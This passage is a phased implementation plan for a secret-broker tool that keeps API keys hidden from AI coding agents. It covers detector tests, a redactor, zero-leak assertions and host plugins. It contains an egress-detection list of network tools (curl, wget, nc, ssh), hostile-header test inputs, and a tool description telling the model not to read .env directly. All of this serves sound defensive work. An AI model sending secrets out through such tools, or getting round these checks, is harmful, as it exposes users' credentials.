│  └─ detector/                    # secret-shaped-string detection (shared by hooks + T3)
├─ plugins/
│  ├─ claude-code/                 # .claude-plugin/, hooks/, commands/, statusline  (Tier A)
│  ├─ cursor/                      # .cursor/rules + mcp.json snippet                (Tier B)
│  ├─ continue/                    # config.yaml snippet                             (Tier B)
│  ├─ aider/                       # .aider.conf.yml + shell recipe                  (Tier C)
│  └─ generic/                     # AGENTS.md block, pre-commit hook, rules text     (Tier B/C)
├─ extensions/
│  └─ vscode/                      # `ide` prompter provider
└─ examples/
   ├─ next-app/                    # end-to-end demo project
   └─ custom-agent/                # Tier 2 demo: 30-line OpenAI-SDK agent using envseal
```

---

## Phase 1 — Protocol package

**Goal:** the types and schemas everything else imports. No I/O.

### T1.1 — Workspace scaffold
Create the pnpm workspace, `turbo.json`, shared `tsconfig.base.json`, eslint config, vitest config.
Create empty package dirs with `package.json` for all seven packages.
**Accept:** `pnpm install && pnpm -r build` exits 0.

### T1.2 — `packages/protocol/src/branded.ts`
```ts
declare const brand: unique symbol;
export type SecretValue = Buffer & { readonly [brand]: 'SecretValue' };
export function asSecret(buf: Buffer): SecretValue;
export function zero(s: SecretValue): void;      // buf.fill(0)
```
`SecretValue` MUST NOT expose a `toString` helper from this module. Conversion to string happens
only in `packages/core/src/sinks/*` via an explicitly named `unsafeToUtf8` that carries an eslint
suppression comment naming the reason.
**Accept:** unit test asserts `zero()` leaves an all-zero buffer.

### T1.3 — `packages/protocol/src/schemas.ts`
Implement every zod schema from §5.5 plus: `KeyStatus`, `Ticket`, `TicketOutcome`, `VerifyResult`,
`ExecResult`, `Manifest`. Every object schema uses `.strict()`.
**Accept:** test asserts `ManifestEntry.safeParse({key:'X',description:'d',value:'sk-1'}).success === false`.

### T1.4 — `packages/protocol/src/errors.ts`
`SepError` class with `code` from the §5.4 union, `retriable: boolean`, `userMessage: string`.
**Accept:** exhaustiveness test over the code union compiles.

### T1.5 — JSON Schema generation
Build step emitting `spec/sep-1/*.schema.json`.
**Accept:** `pnpm build` regenerates them; `git diff --exit-code spec/` is clean on a second run.

**GATE 1:** `pnpm -r typecheck && pnpm -r test` green.

---

## Phase 2 — Detector

Build this early: Phase 4 depends on it for T3, and the hooks depend on it for T4.

### T2.1 — `packages/detector/src/patterns.ts`
Prefix-pattern table sourced from the provider registry files (Phase 3) plus standalone patterns for
AWS, JWT-with-secret, and inline-credential URLs. Each pattern carries `{ id, regex, providerId,
confidence: 'high'|'medium' }`.

### T2.2 — `packages/detector/src/entropy.ts`
`shannonEntropy(s: string): number`. Generic detector: length ≥ 24, entropy ≥ 3.5, passes the
exclusion list (git SHA, UUID, base64 image data, npm integrity hash, common English via a small
bundled wordlist, file paths, URLs without credentials).

### T2.3 — `packages/detector/src/index.ts`
```ts
export function detect(text: string): Detection[];   // {start,end,patternId,confidence,providerId?}
export function redactDetections(text: string, d: Detection[]): string;
```

### T2.4 — Fixture corpus
`packages/detector/test/fixtures/{positive,negative}.txt`. Positive: ≥ 40 realistic-but-fake
credentials across providers. Negative: ≥ 100 strings that must NOT trip it — git SHAs, UUIDs,
minified JS lines, base64 PNGs, lockfile integrity hashes, long file paths, JWT headers without
signatures, CSS-in-JS blobs.
**Accept:** recall ≥ 0.95 on positives (high-confidence patterns 1.0), false-positive rate ≤ 0.02 on
negatives. Assert both numerically in the test.

**GATE 2:** detector metrics assertion passes.

---

## Phase 3 — Provider registry

### T3.1 — Registry schema + loader
`packages/registry/src/index.ts`: `getProvider(id)`, `allProbeHosts(): Set<string>`,
`allPrefixPatterns()`.

### T3.2 — Provider data
≥ 30 entries in `packages/registry/providers/`: openai, anthropic, google-ai, groq, openrouter,
mistral, cohere, huggingface, github, gitlab, stripe, supabase, firebase, planetscale, neon,
postgres, mysql, mongodb, redis, aws, gcp, azure, vercel, netlify, cloudflare, sentry, posthog,
resend, sendgrid, twilio, clerk, auth0, slack, discord, notion, linear.
Each: `id, name, format.pattern, signupUrl, docsUrl, rotateUrl`, and `verify` **only** where a
cheap, side-effect-free, non-rate-limited auth endpoint exists. Where none exists, omit `verify` —
do not invent one.
**Accept:** test validates every file against the schema; test asserts every `verify.url` is
`https:`; test asserts every `format.example` is detected as fake (matches the pattern but is
composed of `X`/`0` filler).

**GATE 3:** all provider files valid; probe-host allowlist non-empty.

---

## Phase 4 — Core broker

### T4.1 — Manifest engine
`packages/core/src/manifest.ts`: `load(root)`, `save(root, manifest)` (JSONC comment-preserving via
`jsonc-parser` edits, not reserialize), `declare(entries)`, `resolveDefaults(entry)` from registry.
**Accept:** round-trip test — load a manifest with comments, add an entry, save; all original
comments survive.

### T4.2 — Presence resolution
`packages/core/src/presence.ts`: per §6.2. MUST NOT mutate `process.env`.
**Accept:** test asserts `process.env` is unchanged after resolving a project with a populated `.env`.

### T4.3 — dotenv sink
`packages/core/src/sinks/dotenv.ts`: line model, surgical edit, atomic write, 0600, CRLF
preservation, gitignore/tracked assertions.
**Accept:** `fast-check` property test — for arbitrary valid `.env` files and arbitrary
(key, value) writes, re-reading yields the new value and every untouched line is byte-identical.
Plus an explicit test that writing to a git-tracked `.env` throws `SEP_GITIGNORE_UNSAFE`.

### T4.4 — Redactor
`packages/core/src/redact.ts` per §7.4.
**Accept:** property test — for any secret (len ≥ 8) and any text, the output contains neither the
secret nor its base64/url-encoded forms nor any ≥20-char prefix.

### T4.5 — Ticket store
`packages/core/src/tickets.ts`: in-memory Map, ULID ids, TTL sweep, `create/get/resolve/expire`,
per-key outcomes. Values held as `SecretValue`, zeroed immediately after the sink write.
**Accept:** test asserts the buffer is all zeros after `resolve()` completes.

### T4.6 — Audit log
`packages/core/src/audit.ts`: append-only JSONL, 0600. Field allowlist enforced by type.
**Accept:** test writes an event carrying a `SecretValue` field → compile error (verified by a
`tsd`/`expect-error` test).

### T4.7 — Verifier + probe approval
`packages/core/src/verify.ts`: template substitution (`{{value}}` only, in header values only —
never in the URL, which would put the key in a request line and thus in proxy logs), host allowlist
check, approval store, status classification, 10 s timeout, no redirects followed.
**Accept:** tests for (a) allowlisted host runs, (b) novel host without approval throws
`SEP_PROBE_NOT_APPROVED`, (c) `{{value}}` in a URL is rejected at declare time, (d) a 401 maps to
`auth_failed` and the response body never appears in the returned object.

### T4.8 — `env_use` executor
`packages/core/src/exec.ts`: spawn with `env: {...process.env, ...secrets}`, no shell (`shell:false`,
argv array), pipe through redactor, kill on timeout, confirmation callback, egress detection
(command basename in `{curl,wget,nc,ssh,scp,rsync,http,httpie}` or args containing a URL).
**Accept:** test spawns a script that echoes the injected value; asserts the returned stdout contains
`«redacted:TEST_KEY»` and not the value.

**GATE 4:** `pnpm -r test` green; coverage on `packages/core` ≥ 85 % lines.

---

## Phase 5 — Prompters

### T5.1 — Interface + registry
`packages/prompters/src/types.ts`:
```ts
export interface Prompter {
  readonly id: string;
  available(): Promise<boolean>;
  prompt(req: PromptRequest): Promise<PromptResponse>;  // values as SecretValue
  cancel(ticket: string): Promise<void>;
}
```
Selection order per §5.3.

### T5.2 — `loopback-browser`
Full §5.2 implementation. The HTML page is a single self-contained template with no external
resources — inline CSS under a CSP nonce, no JS beyond a reveal toggle and submit handling, no
fonts, no images. Renders: project path, the model's verbatim `reason`, the display nonce, and per
key: name, description, provider name, "get your key" link, format hint, masked input, reveal
toggle, skip checkbox.
**Accept:** integration test drives the server with `undici` — asserts (a) wrong path nonce → 404,
(b) `Host: evil.local` → 400, (c) request with `Origin` header → 400, (d) valid POST stores the
value and the listener is closed within 500 ms, (e) second request to the same nonce → connection
refused.

### T5.3 — `native-dialog`
macOS/Windows/Linux per §5.3. Prompt text passed via stdin or a 0600 temp file, never argv.
**Accept:** platform-gated tests; on the CI platform assert `available()` is correct and that the
generated command contains no secret and no prompt text in argv.

### T5.4 — `tty`
Direct `/dev/tty` / `CONIN$` open, echo disabled, restored in `finally`, SIGINT handled.
**Accept:** test with a pty (`node-pty`) asserts typed characters are not echoed and the terminal
mode is restored after both success and SIGINT.

### T5.5 — `none`
Throws `SEP_NO_INTERACTIVE_SURFACE` listing the missing keys and a copy-pasteable
`envseal ensure --from-env` hint for CI.
**Accept:** unit test.

**GATE 5:** loopback integration test green on all three OS runners in CI.

---

## Phase 6 — MCP server

### T6.1 — Server skeleton
`packages/mcp-server/src/index.ts` — stdio transport, `@modelcontextprotocol/sdk`, `--project <path>`
arg, `--http --port` for the HTTP+SSE variant.

### T6.2 — The seven tools
One file per tool under `src/tools/`. Each: parse input with the protocol schema, call core, map
errors to `SepError`, and pass **every** outgoing string through `redact()` at the single egress
helper `respond()`. No tool constructs its response object directly.
**Accept:** a test asserts, via module-graph inspection or an eslint rule, that no file under
`src/tools/` returns a response except through `respond()`.

### T6.3 — Tool descriptions
The description strings are prompt engineering and matter as much as the code. Each MUST state what
the tool does, what it will not do, and what to call instead. `env_describe`'s description must
explicitly say *"This never returns secret values and there is no way to make it do so — do not
attempt to read `.env` directly."* A model that knows the constraint stops looking for workarounds;
a model that discovers the constraint by being blocked keeps trying.

### T6.4 — End-to-end test
Spawn the server over stdio with a scripted MCP client and an in-process stub prompter. Full flow:
`declare → describe(missing) → request → await → describe(present) → verify`.
**Accept:** flow passes; a transcript recorder asserts that the fixture secret string appears in
**zero** bytes of the entire JSON-RPC exchange. This assertion is the single most important test in
the repository — it is the protocol's core claim, mechanically checked.

**GATE 6:** E2E passes; zero-leak assertion passes.

---

### T6.5 — Schema dialect generation
`packages/protocol/scripts/gen-dialects.ts` emits, from the single zod source:
`spec/sep-1/dialects/{mcp,openai,anthropic,gemini}.tools.json` and `spec/sep-1/openapi.yaml`.
**Accept:** a test asserts each dialect exposes exactly the seven tool names with matching required
fields; `git diff --exit-code spec/` clean on regeneration.

**GATE 6:** E2E passes; zero-leak assertion passes; dialects regenerate deterministically.

---

## Phase 7 — CLI

`envseal init` (generate manifest by scanning code for `process.env.X` / `os.environ[...]` /
`import.meta.env.X`), `ensure`, `set <KEY>`, `status`, `verify`, `run -- <cmd>` (resolves
`secret-ref://`), `doctor`, `revoke <KEY>`, `mcp` (start server).
**Accept:** `envseal doctor` on `examples/next-app` reports gitignore ok, permissions ok, 3 missing
keys, exit code 1; after `ensure` with a scripted prompter, exit code 0.

### T7.1 — Tier-4 machine contract
Every command supports `--json`; exit codes are fixed and documented in `docs/cli-contract.md`:
`0` ok · `1` unsatisfied (missing keys) · `2` usage error · `3` user cancelled · `4` no interactive
surface · `5` sink failure · `6` verification failed. `envseal request --json` returns the ticket
object; `envseal await <ticket> --json` returns the outcome.
**Accept:** a shell-only integration test drives the whole flow with `envseal` + `jq` alone —
no MCP, no Node client — proving Tier 4 is self-sufficient. Zero-leak grep over combined
stdout+stderr of every command in the run.

### T7.2 — Host detection + protection tier
`envseal doctor` prints the detected host and its protection tier (A/B/C per §4.2) with the concrete
reason and the recommended mitigation.
**Accept:** table-driven test over fixture project trees for Claude Code, Cursor, Continue, Aider,
and unknown → expected tier.

---

## Phase 7.5 — Tier 2 and Tier 3 bindings

### T7.5.1 — `packages/sdk`
Exports `createBroker(opts)` returning an object with the seven operations, plus
`toolsFor('openai'|'anthropic'|'gemini')` returning ready-to-register tool definitions and a
`dispatch(name, args)` handler. Zero MCP dependency.
**Accept:** `examples/custom-agent` runs a real agent loop against a stub model, provisions a key
through the stub prompter, and passes the zero-leak assertion over the full model-message array.

### T7.5.2 — `packages/http-server`
Loopback-only REST binding of the seven operations, bearer token from `~/.envseal/api-token` (0600),
`Host`/`Origin` validation identical to §5.2, OpenAPI 3.1 served at `/openapi.json`.
**Accept:** contract test drives every endpoint with `curl`; asserts unauthenticated requests → 401
and non-loopback `Host` → 400; zero-leak assertion over all response bodies.

---

## Phase 8 — Claude Code plugin

### T8.1 — Plugin manifest
`plugins/claude-code/.claude-plugin/plugin.json` registering the MCP server, hooks, commands, and
statusline.

### T8.2 — Hooks
`hooks/pre-tool-use.js` (§8.1), `hooks/user-prompt-submit.js` (§8.2), `hooks/session-start.js`
(§8.3). Each is a standalone Node script reading the hook JSON on stdin, ≤ 50 ms cold, with no
dependency on the workspace build (bundle with esbuild into `hooks/dist/`).
**Accept:** golden tests feed recorded hook payloads and assert exact decisions; a benchmark asserts
p95 < 50 ms.

### T8.3 — Commands + statusline
`/env:status`, `/env:setup`, `/env:set`, `/env:verify`, `/env:rotate`, `/env:doctor`,
`/env:allow-once`. Statusline script per §8.4, cached 5 s.

### T8.4 — Manual verification
Install the plugin locally, run the `examples/next-app` scenario end to end in a real Claude Code
session, capture a GIF for the README.
**Accept:** the session transcript file on disk is grepped for the fixture secret → zero matches.
Attach the grep output to the PR.

**GATE 8:** manual scenario passes; transcript grep clean.

---

## Phase 9 — VS Code extension

`window.showInputBox({ password: true, ignoreFocusOut: true })`, registered with the broker over a
named pipe (Windows) / unix socket (POSIX) at a per-user path, 0600. Handshake authenticated with a
token in `~/.envseal/ide-token` so an arbitrary local process cannot register itself as the prompter
and harvest requests.
**Accept:** extension test asserts a broker request surfaces as an input box and the value reaches
the broker without touching disk.

---

## Phase 10 — Interop, docs, release

### T10.1 — Host integration matrix
Ship `plugins/*` and a documented, copy-pasteable config snippet for each host: Claude Code, Codex
CLI, Cursor, Windsurf, Cline, Roo, Zed, Continue, Goose, Amp, JetBrains AI, GitHub Copilot Agent,
Aider, OpenHands, and "any shell agent" (Tier 4). `envseal init --host <name>` writes the snippet
into the right file automatically, and `envseal init` with no argument detects the host.
For hosts without hook support, the docs MUST state the protection tier plainly and recommend the
`keychain` sink.
**Accept:** `docs/hosts/<host>.md` exists for every entry above, each with a verified config snippet
and its tier; `envseal init --host cursor` on a clean fixture produces a `.cursor/mcp.json` that a
schema test validates.

### T10.2 — Spec publication
Copy Part I into `spec/sep-1/SPEC.md` with a conformance section: an implementation is SEP/1
conformant if it implements the seven tools, never returns values, and passes the published
conformance test vectors in `spec/sep-1/conformance/`.

### T10.3 — Security docs
`SECURITY.md` (disclosure policy), `docs/threat-model.md` (§2 verbatim), `docs/residual-risks.md`
(§9 verbatim, prominently linked from the README). Do not soften §9 for marketing.

### T10.4 — README
Lead with the 20-second demo GIF and the one-line claim: *"Your agent can ask for an API key without
ever seeing it."* Then the threat model summary, then install.

### T10.5 — Release
Check the `envseal` name on npm before publishing; if taken, pick an alternative and rename in one
pass (package names, bin name, config dir `.envseal/`, env prefix `SEP_`, docs, the `secret-ref://`
scheme authority). Publish `0.1.0` under Apache-2.0 with provenance attestation
(`pnpm release` from CI — `npm publish` ships `workspace:*` verbatim; see docs/publishing.md).

---

## 11. Cross-cutting test requirements

These are not optional and are not covered by the per-phase criteria:

1. **The zero-leak assertion (T6.4)** runs in CI on every commit against a fixture secret with a
   distinctive sentinel value. If it ever fails, the build is broken regardless of anything else.
2. **A second zero-leak sweep** over every artifact the system writes: audit log, manifest,
   `.envseal/*`, statusline cache, hook output, and the harness transcript. One test, one sentinel,
   grep everything.
3. **Fuzz the dotenv parser** with `fast-check` including CRLF, BOM, quotes, escapes, `export `
   prefixes, duplicate keys, and 1 MB files.
4. **Windows CI is mandatory**, not optional. Path handling, CRLF, `CONIN$`, DPAPI, and the
   PowerShell dialog are all Windows-specific code paths, and the primary development machine for
   this project is Windows.

---

## 12. Sequencing summary

| Phase | Depends on | Deliverable | Gate |
|---|---|---|---|
| 1 Protocol | — | schemas, types, errors | typecheck + tests |
| 2 Detector | 1 | secret-shaped detection | recall ≥ .95, FP ≤ .02 |
| 3 Registry | 1 | 30+ providers, probe allowlist | schema validation |
| 4 Core | 1,2,3 | manifest, sinks, redactor, tickets, verify, exec | coverage ≥ 85 % |
| 5 Prompters | 1,4 | 5 adapters | loopback integration, 3 OS |
| 6 MCP server (Tier 1) | 1,4,5 | SEP/1 over MCP + schema dialects | **zero-leak E2E** |
| 7 CLI (Tier 4) | 4,5,6 | `envseal` binary, machine contract, host detection | shell-only E2E |
| 7.5 SDK + HTTP (Tiers 2,3) | 4,5,6 | importable broker, loopback REST + OpenAPI | custom-agent E2E |
| 8 CC plugin | 6,7,2 | hooks, commands, statusline | transcript grep clean |
| 9 VS Code | 5,6 | `ide` prompter | extension test |
| 10 Release | all | host matrix, spec, docs, npm | provenance publish |

Phases 2 and 3 are independent of each other and may run in parallel. Phase 7 and Phase 7.5 are
independent of each other and may run in parallel. Everything else is sequential.

### 12.1 Portability invariant (check at every gate)

`packages/core` MUST have zero dependencies on any host, harness, or agent SDK — verified
mechanically by a dependency-graph test asserting its `package.json` and import graph contain no
`@modelcontextprotocol/*`, no `openai`/`@anthropic-ai/*`/`@google/*`, and no `vscode`. If that test
ever fails, host-specific logic has leaked into the protocol core and the design claim "plugs into
any AI coding tool" is no longer true.
